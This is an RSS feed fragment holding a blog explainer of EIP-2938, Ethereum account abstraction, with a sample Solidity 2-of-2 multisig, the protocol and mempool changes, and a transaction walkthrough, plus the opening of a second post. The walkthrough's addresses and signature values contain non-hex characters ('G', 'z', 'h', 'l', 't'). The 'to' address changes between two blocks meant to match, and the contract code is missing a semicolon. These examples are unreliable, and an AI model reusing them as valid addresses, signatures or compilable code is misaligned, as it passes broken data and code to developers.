+&lt;p&gt;In this article, we want to give a brief and understandable explanation of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2938.md&quot;&gt;EIP-2938&lt;&#x2F;a&gt;, our proposal to bring AA to Ethereum.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;a-concrete-example&quot;&gt;A Concrete Example&lt;&#x2F;h3&gt;
+&lt;p&gt;The best way to explore AA is to see what you can build with it! So without further ado, here&#x27;s a 2-of-2 multisig wallet that pays for its own transactions:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MPL-2.0
+
+pragma solidity ^0.7.1;
+pragma experimental ABIEncoderV2;      &#x2F;&#x2F; Enables structs in the ABI.
+
+account contract TwoOfTwo {            &#x2F;&#x2F; Note the new `account` keyword!
+                                       &#x2F;&#x2F; This marks the contract as
+                                       &#x2F;&#x2F; accepting AA transactions, and
+                                       &#x2F;&#x2F; makes solidity emit a special
+                                       &#x2F;&#x2F; prelude. More on that later.
+
+    struct Signature {
+        uint8 v;
+        bytes32 r;
+        bytes32 s;
+    }
+
+    address public owner0;            &#x2F;&#x2F; Making calls from this account
+    address public owner1;            &#x2F;&#x2F; requires two signatures, making
+                                      &#x2F;&#x2F; this a 2-of-2 multisig.
+    
+    constructor(
+        address _owner0,
+        address _owner1
+    ) payable {
+        owner0 = _owner0;
+        owner1 = _owner1;
+    }
+    
+    function transfer(                &#x2F;&#x2F; Emulates a regular Ethereum
+        uint256 gasPrice,             &#x2F;&#x2F; transaction, but with a new
+        uint256 gasLimit,             &#x2F;&#x2F; validity requirement:
+        address payable to,           &#x2F;&#x2F;
+        uint256 amount,               &#x2F;&#x2F;
+        bytes calldata payload,       &#x2F;&#x2F;
+        Signature calldata sig0,      &#x2F;&#x2F; Two signatures instead of one!
+        Signature calldata sig1
+    ) external {
+        bytes32 digest = keccak256(   &#x2F;&#x2F; The signature validation logic
+            abi.encodePacked(         &#x2F;&#x2F; for AA contracts is implemented
+                this,                 &#x2F;&#x2F; in the contract itself. This
+                gasPrice,             &#x2F;&#x2F; gives contracts a ton of
+                gasLimit,             &#x2F;&#x2F; flexibility. You don&amp;#39;t even need
+                to,                   &#x2F;&#x2F; to use ECDSA signatures at all!
+                amount,
+                tx.nonce,             &#x2F;&#x2F; Newly exposed!
+                payload
+            )
+        );
+
+        address signer0 =             &#x2F;&#x2F; If either signature is invalid
+            recover(digest, sig0);    &#x2F;&#x2F; the contract reverts the
+        require(owner0 == signer0);   &#x2F;&#x2F; transaction.
+        
+        address signer1 =             &#x2F;&#x2F; Since the revert happens before
+            recover(digest, sig1)     &#x2F;&#x2F; `paygas` is called, the entire
+        require(owner1 == signer1);   &#x2F;&#x2F; transaction is invalid, and
+                                      &#x2F;&#x2F; this contract&amp;#39;s balance is not
+                                      &#x2F;&#x2F; reduced.
+
+        paygas(gasPrice, gasLimit);   &#x2F;&#x2F; Signals that the transaction is
+                                      &#x2F;&#x2F; valid, and the gas price and
+                                      &#x2F;&#x2F; limit the contract is willing to
+                                      &#x2F;&#x2F; pay. Also creates a checkpoint:
+                                      &#x2F;&#x2F; changes before `paygas` are not
+                                      &#x2F;&#x2F; reverted if execution fails past
+                                      &#x2F;&#x2F; this point.
+        
+        (bool success,) =
+            to.call{value: amount}(payload);
+        require(success);
+    }
+    
+    function recover(
+        bytes32 digest,
+        Signature calldata signature
+    ) private pure returns (address) {
+        return ecrecover(
+            digest,
+            signature.v,
+            signature.r,
+            signature.s
+        );
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This is a rough sketch of how AA support could look in solidity, based on our early prototypes (available in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;quilt&#x2F;account-abstraction-playground&quot;&gt;playground&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;what-is-eip-2938&quot;&gt;What is EIP-2938?&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2938.md&quot;&gt;EIP-2938&lt;&#x2F;a&gt; is a specification for one flavor of AA, designed to be fairly simple to implement while allowing new and more powerful features to be developed in the future.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;consensus-changes&quot;&gt;Consensus Changes&lt;&#x2F;h3&gt;
+&lt;p&gt;The EIP contains three consensus critical changes:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Add a new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2718.md&quot;&gt;EIP-2718&lt;&#x2F;a&gt; transaction type with fields &lt;code&gt;[nonce, target, data]&lt;&#x2F;code&gt;, where &lt;code&gt;target&lt;&#x2F;code&gt; is the AA contract&#x27;s address. Note the omission of &lt;code&gt;to&lt;&#x2F;code&gt;, &lt;code&gt;gas_price&lt;&#x2F;code&gt;, &lt;code&gt;gas_limit&lt;&#x2F;code&gt;, and signature fields. Transactions of this type set &lt;code&gt;tx.origin&lt;&#x2F;code&gt; to &lt;code&gt;0xffff...ff&lt;&#x2F;code&gt;; a special address known as the AA entry point.&lt;&#x2F;li&gt;
+&lt;li&gt;Add a &lt;code&gt;NONCE&lt;&#x2F;code&gt; opcode (&lt;code&gt;tx.nonce&lt;&#x2F;code&gt; in solidity) that pushes the transaction&#x27;s nonce field.&lt;&#x2F;li&gt;
+&lt;li&gt;Add a &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; opcode which:
+&lt;ul&gt;
+&lt;li&gt;Creates an irrevertible checkpoint, guaranteeing state changes before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; cannot be undone by subsequent code.&lt;&#x2F;li&gt;
+&lt;li&gt;Accepts a version argument, followed by a variable number of arguments. Initially the version is always &lt;code&gt;1&lt;&#x2F;code&gt;, but exists for future compatibility with, for example, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-1559.md&quot;&gt;EIP-1559&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;In this first version:
+&lt;ul&gt;
+&lt;li&gt;Accepts a gas price and gas limit, signaling the contract&#x27;s willingness to pay for the transaction.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;other-changes&quot;&gt;Other Changes&lt;&#x2F;h3&gt;
+&lt;p&gt;When the existing transaction pool logic is combined with AA&#x27;s arbitrary transaction validity a new&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; type of attack on the Ethereum network is possible: a single transaction included in a mined block can invalidate a large number of previously valid pending transactions. Under a sustained attack, nodes would waste significant computation validating, propagating, then discarding these transactions. The EIP introduces a number of transaction pool restrictions to mitigate this attack, bringing the risk to a level comparable to non-AA transactions.&lt;&#x2F;p&gt;
+&lt;p&gt;First, nodes will not accept AA transactions with nonces higher than the currently valid nonce. If multiple transactions arrive with the same nonce, only the highest paying transaction will be kept. When the currently valid nonce for an AA contract changes (i.e. upon receipt of a new block with a transaction for that contract), nodes will drop the pending transaction for that contract, if one exists.&lt;&#x2F;p&gt;
+&lt;p&gt;Second, the EIP proposes a standard bytecode prefix for AA contracts. For non-AA invocations (i.e. &lt;code&gt;msg.sender != 0xffff...ff&lt;&#x2F;code&gt;) the prefix emits a log of &lt;code&gt;msg.sender&lt;&#x2F;code&gt; and &lt;code&gt;msg.value&lt;&#x2F;code&gt;. For AA invocations, the prefix passes execution to the main contract. Nodes will drop any AA transactions targeting a contract which doesn&#x27;t begin with this standard prefix. Over time, more prefixes can be added (without a hard fork) to allow further functionality.&lt;&#x2F;p&gt;
+&lt;p&gt;Finally, encountering any of the following conditions before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; will cause the node to immediately drop the transaction:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;An environment opcode (&lt;code&gt;BLOCKHASH&lt;&#x2F;code&gt;, &lt;code&gt;COINBASE&lt;&#x2F;code&gt;, ...);&lt;&#x2F;li&gt;
+&lt;li&gt;Retrieving the &lt;code&gt;BALANCE&lt;&#x2F;code&gt; of any account, including the target itself;&lt;&#x2F;li&gt;
+&lt;li&gt;An external call&#x2F;create (except to precompiles);&lt;&#x2F;li&gt;
+&lt;li&gt;An external state access that reads code (&lt;code&gt;EXTCODEHASH&lt;&#x2F;code&gt;, ...);&lt;&#x2F;li&gt;
+&lt;li&gt;More than a fixed validation gas limit (currently 90,000) has been consumed.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;These restrictions ensure that the only state accessible to the validity logic is state internal to the AA contract, and that this state can only be modified by the contract itself. Therefore, a pending transaction to an AA contract may only be invalidated by a block containing another transaction targeting the same contract.&lt;&#x2F;p&gt;
+&lt;p&gt;Furthermore, these restrictions give nodes assurances regarding AA transaction validity similar to those that non-AA transactions already have. As these are not consensus changes, miners are free to include transactions in a block that break these rules.&lt;&#x2F;p&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;This isn&#x27;t strictly a &lt;em&gt;novel&lt;&#x2F;em&gt; attack, but it is significantly more problematic with AA contracts. For a more in-depth discussion, see &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;dos-vectors-in-account-abstraction-aa-or-validation-generalization-a-case-study-in-geth&#x2F;7937&quot;&gt;DoS Vectors in Account Abstraction (AA) or Validation Generalization, a Case Study in Geth&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;what-isn-t-eip-2938&quot;&gt;What isn&#x27;t EIP-2938?&lt;&#x2F;h2&gt;
+&lt;p&gt;If you&#x27;ve been following AA over the last couple years, you might have some expectations. Sorry to disappoint, but here&#x27;s some of what you &lt;strong&gt;won&#x27;t&lt;&#x2F;strong&gt; be getting with EIP-2938:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Nonce Abstraction: EIP-2938 transactions still require a sequential nonce&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;, enforced by the protocol, to maintain transaction hash uniqueness.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Generally Efficient Transaction Propagation: Nodes will only store and propagate the single highest paying EIP-2938 transaction per AA contract. This works fine for single-tenant applications like smart wallets, and can be extended to multi-tenant applications in the future.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Calling into AA Contracts: Requires &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2970.md&quot;&gt;EIP-2970&lt;&#x2F;a&gt; to prevent attacks that invalidate large numbers of pending transactions.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;DELEGATECALL&lt;&#x2F;code&gt;: Requires &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2937.md&quot;&gt;EIP-2937&lt;&#x2F;a&gt; for the same reason.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Meta-transactions: Setting &lt;code&gt;msg.sender&lt;&#x2F;code&gt; and&#x2F;or &lt;code&gt;tx.origin&lt;&#x2F;code&gt; is way out of scope.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
+&lt;p&gt;Quilt has done some &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@SamWilsn&#x2F;B1c0ZdaGP&quot;&gt;limited research&lt;&#x2F;a&gt; into how contracts can combine multiple transactions into one bundle transaction.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;an-eip-2938-transaction-from-metamask-to-etherscan&quot;&gt;An EIP-2938 Transaction: From MetaMask to Etherscan&lt;&#x2F;h2&gt;
+&lt;p&gt;Using the same 2-of-2 multisig contract introduced earlier, this section walks through how an AA transaction is different than a traditional transaction.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;transaction-creation&quot;&gt;Transaction Creation&lt;&#x2F;h3&gt;
+&lt;p&gt;Most of structure of an AA transaction is up to the contract itself (besides the mandatory fields). To create a simple transfer transaction for our multisig, first we collect the function arguments:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gasPrice&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x2f00000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gasLimit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x17000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x6e609f3bD483769223393s89cB6C2033DeCe5eFc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Then we compute the keccak hash and sign it with both owner keys to give the full calldata:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gasPrice&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x2f00000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gasLimit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x17000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x6e609f3bG483769223393e89cB6C2033DeCe5eDc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sig0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: {
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x1b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x2655d252e8bc596535342e1fde05851bz643eae7a4caa79df3af9aa5aaa5824b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0xd3e8946829h049c3cf12ab029cd7cd5ecfe8355b1108ee3aca9e7ca629b9f9f6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+    },
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sig1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: {
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x1c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0xc76654967f753b2578aad6l7261f15f85a6d2f280b49ef14eb239729f657a00b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x8631226829cc9e10f7192cd5cac20dcdtc8d815f8edb7e9a79052251e4f2824e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finally, the calldata is inserted into the transaction envelope (the mandatory fields mentioned above):&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nonce&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x4DEc645e385Ab34d33919ca024dECFD0c4543G40&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;,
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;: { &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;...&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note the difference in envelope fields from a traditional transaction; specifically:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;No gas price or limit,&lt;&#x2F;li&gt;
+&lt;li&gt;No value to send,&lt;&#x2F;li&gt;
+&lt;li&gt;No signature fields, and&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;target&lt;&#x2F;code&gt; instead of &lt;code&gt;to&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Instead, for the multisig contract, these fields are conveyed in the calldata and handled by the contract itself! Other contracts could use entirely different fields.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;transaction-propagation&quot;&gt;Transaction Propagation&lt;&#x2F;h3&gt;
+&lt;p&gt;When a traditional transaction arrives at a node, it is checked for validity. The same is true for AA transactions, though the checks are different.&lt;&#x2F;p&gt;
+&lt;p&gt;When processing incoming traditional transactions, nodes check that:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Their nonce matches the account&#x27;s next nonce or is Close Enough™,&lt;&#x2F;li&gt;
+&lt;li&gt;The account balance is sufficient to cover their value plus maximum gas fees, and&lt;&#x2F;li&gt;
+&lt;li&gt;Their signature matches the account&#x27;s address.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;When processing incoming AA transactions, however, nodes check that:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Their nonce matches the contract&#x27;s next nonce exactly,&lt;&#x2F;li&gt;
+&lt;li&gt;The contract&#x27;s bytecode begins with a standard prefix,&lt;&#x2F;li&gt;
+&lt;li&gt;The validation logic calls &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; before reaching the validation gas limit,&lt;&#x2F;li&gt;
+&lt;li&gt;No banned opcodes are called before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt;, and&lt;&#x2F;li&gt;
+&lt;li&gt;The contract&#x27;s balance is sufficient to cover the gas fees set by &lt;code&gt;PAYGAS&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;block-propagation&quot;&gt;Block Propagation&lt;&#x2F;h3&gt;
+&lt;p&gt;When the block arrives containing the AA transaction, any other pending transactions for the same account are dropped. This is different from traditional transactions, which get revalidated and possibly broadcast upon receipt of a new block.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;call-to-action&quot;&gt;Call to Action&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;feedback-questions&quot;&gt;Feedback &amp;amp; Questions&lt;&#x2F;h3&gt;
+&lt;p&gt;Time to celebrate! You made it through the explainer. You&#x27;re not done yet though. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2938.md&quot;&gt;EIP-2938&lt;&#x2F;a&gt; is still rather short on feedback. If you have any questions or suggestions please &lt;a href=&quot;https:&#x2F;&#x2F;ethereum-magicians.org&#x2F;t&#x2F;eip-2938-account-abstraction&#x2F;4630&quot;&gt;leave a comment&lt;&#x2F;a&gt;! You can also find us on the &lt;a href=&quot;https:&#x2F;&#x2F;discord.gg&#x2F;GU55yAW&quot;&gt;Ethereum R&amp;amp;D Discord&lt;&#x2F;a&gt; in the &lt;code&gt;#account-abstraction&lt;&#x2F;code&gt; channel.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;you-re-a-dapp-developer&quot;&gt;You&#x27;re a dApp developer?&lt;&#x2F;h3&gt;
+&lt;p&gt;Are you a smart contract or dApp developer interested in AA? Drop by the &lt;a href=&quot;https:&#x2F;&#x2F;discord.gg&#x2F;GU55yAW&quot;&gt;Ethereum R&amp;amp;D Discord&lt;&#x2F;a&gt; (&lt;code&gt;#account-abstraction&lt;&#x2F;code&gt;), we&#x27;d love to hear about your use case!&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;you-re-a-core-dev&quot;&gt;You&#x27;re a core dev?&lt;&#x2F;h3&gt;
+&lt;p&gt;What implementation challenges stand in the way of this EIP? Are you afraid AA will collapse the network? &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;dos-vectors-in-account-abstraction-aa-or-validation-generalization-a-case-study-in-geth&#x2F;7937&quot;&gt;We&#x27;re pretty sure it won&#x27;t&lt;&#x2F;a&gt;, but we&#x27;d be happy to talk about it!&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;you-want-to-try-aa&quot;&gt;You want to try AA?&lt;&#x2F;h3&gt;
+&lt;p&gt;Quilt has built an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;quilt&#x2F;account-abstraction-playground&quot;&gt;AA playground&lt;&#x2F;a&gt; on top of Geth, but it&#x27;s a little out of sync with the EIP. Let us know how you&#x27;d like to try it, and we can update it!&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>Automated Detection of Dynamic State Access in Solidity</title>
+                <pubDate>Fri, 21 Feb 2020 18:39:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/ethereum-taint/</link>
+                <guid>https://binarycake.ca/posts/ethereum-taint/</guid>
+                <description>&lt;p&gt;&lt;em&gt;Originally posted on &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;automated-detection-of-dynamic-state-access-in-solidity&#x2F;7003&quot;&gt;ethresear.ch&lt;&#x2F;a&gt;.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
+&lt;p&gt;Deciding to support only static state access (SSA) or to support full dynamic state access (DSA) is one of the remaining open questions on the Eth2 roadmap. If a purely SSA system proves feasible, there are a number of benefits that simplify:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;State providers;&lt;&#x2F;li&gt;
+&lt;li&gt;Synchronous communication between execution environments;&lt;&#x2F;li&gt;
+&lt;li&gt;Account abstraction; and&lt;&#x2F;li&gt;
+&lt;li&gt;Transaction pools, witness aggregation and refreshes.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
